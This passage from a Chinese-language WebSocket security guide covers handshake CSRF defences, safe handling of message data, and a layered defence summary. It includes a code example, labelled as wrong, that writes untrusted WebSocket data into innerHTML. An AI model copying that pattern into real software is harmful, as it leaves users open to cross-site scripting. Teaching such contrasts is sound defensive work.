- `Origin` 头由浏览器自动设置且不可被 JavaScript 伪造（通过 `fetch` 或 `XMLHttpRequest` 发起的请求可能受此限制）
- 但 `Origin` 头可能被代理或某些浏览器扩展修改，因此不能单独作为唯一的安全机制
- 旧浏览器可能不发送 `Origin` 头，需要处理空值的情况

**方案 C -- 自定义不可预测的 Header：**

在客户端通过 JavaScript 设置一个自定义请求头，服务端验证该头是否存在及其值是否有效。由于跨域请求无法设置某些自定义 Header（受 CORS 预检限制），这可以作为一种 CSRF 防御。

**方案 D -- SameSite Cookie（辅助措施）：**

将会话 Cookie 的 `SameSite` 属性设置为 `Strict` 或 `Lax`。这是浏览器层面的防护，但不能替代服务端验证，因为不是所有浏览器都支持。

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

**防御层次建议：** 将方案 A（CSRF Token）或方案 B（Origin 校验）作为主要防线，方案 C 作为补充，方案 D 作为纵深防御的浏览器层保障。

### 7.3 数据层防护

**4. 双向将 WebSocket 数据视为不可信数据**

无论是服务端接收数据还是客户端接收数据，都需要对 WebSocket 消息内容进行安全处理。

**服务端侧：**

- 使用参数化查询（Prepared Statements）代替字符串拼接，防止 SQL/NoSQL 注入
- 使用安全的 XML 解析器（禁用外部实体解析），防止 XXE
- 对传递给系统命令的数据进行严格校验和白名单过滤
- 对传递给文件系统的路径进行规范化校验，防止路径遍历

**客户端侧：**

- 使用 `textContent` 而非 `innerHTML` 将数据写入 DOM，防止 XSS
- 如果必须使用 `innerHTML`，对数据先进行严格的 HTML 编码
- 使用 `DOMPurify` 等库对 HTML 内容进行清理
- 不要将从 WebSocket 接收的数据传递给 `eval()`、`new Function()` 或类似危险函数
- 不要将从 WebSocket 接收的数据作为 `script.src`、`iframe.src` 或类似属性使用

```javascript
// 错误：直接将 WebSocket 数据写入 innerHTML
ws.onmessage = function(event) {
    document.getElementById('chat').innerHTML += event.data;
};

// 正确：使用 textContent 或先编码
ws.onmessage = function(event) {
    var div = document.createElement('div');
    div.textContent = event.data;
    document.getElementById('chat').appendChild(div);
};
```

### 7.4 纵深防御总结

| 防御层级 | 措施 | 防护范围 |
|---------|------|---------|
| 传输层 | 使用 `wss://`（TLS） | 防窃听、防篡改、防中间人 |
| 握手层 | CSRF Token / Origin 校验 | 防跨站 WebSocket 劫持 |
| 握手层 | 硬编码 WebSocket URL | 防 WebSocket URL 投毒 |
| 数据层（服务端） | 参数化查询、安全解析器 | 防注入类漏洞 |
| 数据层（客户端） | 安全 DOM 操作、避免危险函数 | 防 XSS 执行 |
| 会话层 | SameSite Cookie（Strict/Lax） | 浏览器侧辅助防护 |
| 架构层 | 会话变更时主动关闭 WebSocket 连接 | 防会话状态不一致 |

---

## 参考资源

- PortSwigger Web Security Academy: WebSockets
- RFC 6455: The WebSocket Protocol
- OWASP: HTML5 Security Cheat Sheet - WebSocket Security
- PortSwigger Research: Cross-Site WebSocket Hijacking (CSWSH)
- CWE-352: Cross-Site Request Forgery (CSRF) -- 包含 WebSocket 握手上下文
